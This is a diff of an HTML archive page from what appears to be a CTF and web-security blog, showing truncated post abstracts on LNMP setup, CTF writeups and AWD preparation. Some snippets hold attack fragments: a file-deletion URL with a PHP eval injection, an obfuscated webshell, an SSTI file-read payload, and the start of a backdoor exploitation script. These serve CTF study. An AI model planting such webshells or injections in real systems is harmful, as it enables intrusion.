@@ -341,6 +341,153 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href="/posts/18428/">
+            
+                <span>lamp &amp;&amp; lnmp以apt-get的方式安装</span>
+        </a>
+        <div class="abstract-content">
+            lnmp
+安装nginx
+
+sudo apt-get install nginx
+
+
+安装php
+
+sudo apt-get install php
+
+
+安装php-fpm
+
+sudo apt-get install php-fpm
+
+
+配置 /etc/nginx/
+12345678910# pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000#location ~ \.php$ &#123;   include snippets/fastcgi-php.conf;   # With php7.0-cgi a...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/09/05</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="运维">运维</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/posts/7418/">
+            
+                <span>WEBSEC-Writeup</span>
+        </a>
+        <div class="abstract-content">
+            level81234567891011121314151617181920 &lt;?php $uploadedFile = sprintf('%1$s/%2$s', '/uploads', sha1($_FILES['fileToUpload']['name']) . '.gif');if (file_exists ($uploadedFile)) &#123; unlink ($uploadedFile); &#125;if ($_FILES['fileToUpload']['size'] &lt;= 50000) &#123;if (getimagesize ($_FILES['f...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/09/04</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/posts/42614/">
+            
+                <span>TokyoWesterns CTF</span>
+        </a>
+        <div class="abstract-content">
+            SimpleAuth123456789101112131415161718192021222324252627282930313233&lt;?phprequire_once 'flag.php';if (!empty($_SERVER['QUERY_STRING'])) &#123;    $query = $_SERVER['QUERY_STRING'];    $res = parse_str($query);    if (!empty($res['action']))&#123;        $action = $res['action'];    &#125;&#125;i...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/09/02</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/posts/12920/">
+            
+                <span>awd准备工作</span>
+        </a>
+        <div class="abstract-content">
+            准备工作源代码备份
+xftp
+
+scp
+
+scp -r -P Port remote_username@remote_ip:remote_folder local_file
+
+
+
+主机发现
+nmap
+
+nmap -sn 192.168.71.0/24
+
+
+httpscan
+
+https://github.com/zer0h/httpscan
+
+
+
+弱口令预留后门
+D盾
+河马
+
+后门利用脚本
+12345678910111213141516171819202122232425#coding=utf-8import requestsurl="http://192.168.71."url1=""...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/08/21</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href="/posts/41139/">
             
                 <span>how2heap-分析总结（一）</span>
@@ -499,22 +646,17 @@ ip2long
                 <span>巅峰极客ctf</span>
         </a>
         <div class="abstract-content">
-            pentest
-御剑扫描
-
+            pentest御剑扫描
 经过目录扫描，发现file/file.php
 根据网页最后提示:
 12DELETE FILESorry,no filename!
 可以猜测存在任意文件删除漏洞。
-
 首先我们删除install.lock
 1http://c2a2868220484acaae0b962988dbecbbd872061666de4bc6.game.ichunqiu.com/file/file.php?file=...//config/install.lock
-
 重装metinfo，重装的时候数据库名填写 
 1met#*/@eval($_GET[1]);/*
 数据库密码为root
-
-执...
+执行shel...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
@@ -532,154 +674,10 @@ ip2long
         </div>
     </article>
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/5109/">
-            
-                <span>php-命令执行</span>
-        </a>
-        <div class="abstract-content">
-            
-webshell
-
-123456&lt;?=$_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);=&gt; $_GET[_]($_GET[__]);=&gt;&lt;?=`&#123;$&#123;~"����"&#125;[_]&#125;`;// echo -ne '&lt;?=`&#123;$&#123;~"\xa0\xb8\xba\xab"&#125;[_]&#125;`;'
-
-写文件&amp;读文件
-
-php的标签&lt;?php存在字母肯定不行，尝试&lt;?发现不解析，...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/18</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="web安全">web安全</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/62555/">
-            
-                <span>RSA学习</span>
-        </a>
-        <div class="abstract-content">
-            openssl相关操作提取pubkey.pem相关信息
-1openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem
-解密:
-1openssl rsautl -decrypt -in 【flag.enc】 -inkey 【private.pem】
-已知p,q若已知质数p和q，则通过依次计算欧拉函数值phi、私钥d可解密。在选取加密指数e时要求phi，e互质，也就是gcd(phi,e)==1 ，如果不满足是无法直接解密的。
-123456789def rsa_decrypt(e, c, p, q):    phi = (p - 1)...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/17</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/28940/">
-            
-                <span>ssti</span>
-        </a>
-        <div class="abstract-content">
-            payload大全bypass 各种字符串
-利用request.args
-
-1&#123;&#123;&apos;&apos;[request.args.a][request.args.b][2][request.args.c]()[40](&apos;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&apos;)[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read
-
-利用字符串拼接
-
-12&#123;&#123;requ...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/17</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="python安全">python安全</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/45992/">
-            
-                <span>php命令执行函数</span>
-        </a>
-        <div class="abstract-content">
-            代码或命令执行函数：
-
-system                    允许执行一个外部程序并回显输出，类似于 passthru() 
-shell_exec
-exec                        允许执行一个外部程序 
-curl_exec
-popen               可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。
-proc_open               执行一个命令并打开文件指针用于读取以及写入 
-passthru                   允许执行一个外部程序并回显输出 
-pcntl_exec...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/15</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="web安全">web安全</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
     <!-- paginator  -->
     
     <nav class="page-nav">
-        <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><a class="page-number" href="/archives/page/4/">4</a><a class="extend next" rel="next" href="/archives/page/2/">NEXT &#62;</a>
+        <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/5/">5</a><a class="extend next" rel="next" href="/archives/page/2/">NEXT &#62;</a>
     </nav>
     
 </main>
@@ -1354,9 +1352,101 @@ pcntl_exec...
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 40
+        Total : 44
         </div>
         <!-- search  -->
         
@@ -1369,6 +1459,26 @@ pcntl_exec...
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href="/posts/18428/">lamp && lnmp以apt-get的方式安装</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/04</span><a class="archive-post-title" href="/posts/7418/">WEBSEC-Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href="/posts/42614/">TokyoWesterns CTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href="/posts/12920/">awd准备工作</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1582,6 +1692,8 @@ pcntl_exec...
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
         <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
+    
+        <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
